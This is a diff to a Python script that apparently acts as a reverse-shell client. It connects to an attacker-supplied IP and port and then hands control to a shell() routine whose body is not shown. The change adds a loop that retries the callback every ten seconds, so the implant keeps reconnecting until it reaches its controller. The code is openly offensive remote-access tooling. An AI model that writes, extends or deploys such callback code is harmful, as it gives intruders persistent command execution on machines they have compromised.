@@ -1,9 +1,23 @@
 #!/usr/bin/python3
 
-import socket, sys, argparse, subprocess, json, os, base64, random, string
+import socket, sys, argparse, subprocess, json, os, base64, random, string, time
 from datetime import datetime
 
 ENCODING = "utf-8"
+
+def connection(ip, port):
+  global s
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  print("[+] Connecting to %s:%d" % (ip, port))
+  while True:
+    time.sleep(10)
+    try:
+      s.connect((ip, port))
+      shell()
+    except Exception as e:
+      print(e)
+      time.sleep(10)
+      connection(ip, port)
 
 def generate_random():
   ct = datetime.today().strftime('%Y%m%d%H%M%S')
@@ -94,17 +108,11 @@ def main():
   srv_ip = args.i
   srv_port = args.p
 
-  global s
   try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("[+] Connecting to %s:%d" % (srv_ip, srv_port))
-    s.connect((srv_ip, srv_port))
-    shell()
+    connection(srv_ip, srv_port)
   except:
     print("[-] Could not connect on %s:%d" % (srv_ip, srv_port))
     sys.exit(1)
-  finally:
-    s.close()
 
 if __name__ == "__main__":
     main()
